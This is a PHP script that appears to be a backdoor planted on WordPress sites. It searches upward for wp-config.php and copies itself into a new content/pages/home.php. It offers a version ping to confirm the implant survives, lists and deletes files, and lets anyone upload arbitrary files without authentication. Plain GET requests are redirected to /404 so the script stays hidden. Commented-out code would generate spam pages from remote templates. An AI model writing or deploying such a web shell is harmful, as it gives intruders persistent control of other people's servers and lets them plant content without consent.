<?php
define('VERSION', 'v3');
header('Access-Control-Allow-Origin: *');
function a($x,$y){
    return in_array($x,$y);
}

function isHtml($var){
    if(preg_match("/\.html/i", $var) == 1)
        return $var;
    // else 
    //     return "";
}

//init 
if(array_keys($_GET)[0] && array_keys($_GET)[0] == 'init' ){
    $dirs;
    $i = 0;
    do {
        $dirs = scandir(getcwd());
        if(a('wp-config.php',$dirs)){
        break;
        }
        else {
            chdir('../');
        }
        $i++;
    } while(!a('wp-config.php',$dirs) || $i<10);
    
    $path = 'content/pages/';

    //$path = array("content/pages", "contents/pages", "contents/posts", "pages/content","posts/content");
    //$script_path = $path[0];
    
    /* echo $script_path;
    exit; */

    /* for($i = 0; $i < count($path); $i++ ){
        if(!a(explode("/", $path)[0], $dirs)){
            $script_path = $path[i];
            break;
        }
    } */



    if(!a('content', $dirs)){
        $t = mkdir($path, 0777, true);
        if($t){
            if(copy(__FILE__, $path.'home.php')){
                echo ($path."home.php");
                exit;
            }
            else {
                echo ("error. cannot set the script");
                exit;
            }
        }
        else {
            echo ("error. cannot create dirs");
            exit;
        }
    }
	echo 'done';
    exit;
}
elseif(array_keys($_GET)[0] && array_keys($_GET)[0] == 'list'){
    $files = scandir(getcwd());
    
    $fixed;
    $htmls = array_filter($files, "isHtml");
    foreach($htmls as $val){
        if($val != "sitemap.html")
            $fixed[] = $val;
    }
    
    echo json_encode($fixed);
    
}
//check ver
elseif(array_keys($_GET)[0] && array_keys($_GET)[0] !== 'init' && array_keys($_GET)[0] !== 'list'){
    //for checking if script still exists
    echo VERSION;
    exit;
}
//upload || rm
else {
  
    if(getenv('REQUEST_METHOD') == 'GET'){
        header('Location: /404');

    }
    
    $d = file_get_contents('php://input');

    if($d == false && isset($_POST['a']) == false)
        die(json_encode('thanks'));
    
    
    $d = json_decode($d, true);
    
//upl
    if($_POST['a'] && $_POST['a' ] == 'upl' ){

        $uplF = "";

        $uplD = "./";
        $uplF = $uplD . basename($_FILES['uplFile']['name']);
        if(move_uploaded_file($_FILES['uplFile']['tmp_name'], $uplF)){
            //echo 'upload ok ';
            if($_POST['ver'] && $_POST['ver'] == 'upd'){


            }
            echo $uplF;

        }
        else {
            echo 'error. fail to upload';
        }
        exit;
    }
//rm
    if($d['a'] && $d['a'] == rm){
        $postname = basename($d['page_url']);
        $dirs = scandir(getcwd());
        if(a($postname,$dirs)){
            unlink($postName);
            $result = array();
            $result['action'] = "Remove Post";
            $result['result'] = "Success";
            
            echo json_encode($result);
            exit;
        }
            
            $result = array();
            $result['action'] = "Remove Post";
            $result['result'] = "Error. No Such Post";
            
            echo json_encode($result);
            exit;
    }
    
    

    /* if(!$d['template_url'] || $d['template_url'] == ""){
        die('miss');
    }
    
    
    
    
    $filename = sanitizePageUrl($d['page_url']).'.html';
    
    $posts = scandir(getcwd());
    if(a($filename,$posts) && $d['or'] == 0){
        //posts exists and override set to 0 (No)
        echo ('{"result": "Error. Post exists","action":"Upload Post" }');
        exit;
    }
    
    $html = get_page($d['template_url']);
    
    
    $tagInput = $d['tag'];
    $tag = '#'.$tagInput.'(.*?)'.getClosingTag($tagInput).'#is';
    


    
    preg_match($tag, $html, $matches1);
    


    
    $title = '#<title>(.*?)</title>#is';
    preg_match($title, $html, $matches);
    
    $html = str_replace($matches[1], $d['title'], $html);
    $html = str_replace($matches1[1], $d['content'], $html);
    
    $nFile = @fopen($filename, "w");
    @fwrite($nFile, $html);
    @fclose($nFile);
    
    $result = array();
    
    $result['action'] = "Upload Post";
    $result['result'] = 'Success';
    $result['PostURL'] = $_SERVER['SCRIPT_URI'].$filename;
    $result['PostURL'] = str_replace(basename($_SERVER['SCRIPT_URI']),"", $result['PostURL']);
    
    echo json_encode($result); */    
}




?>
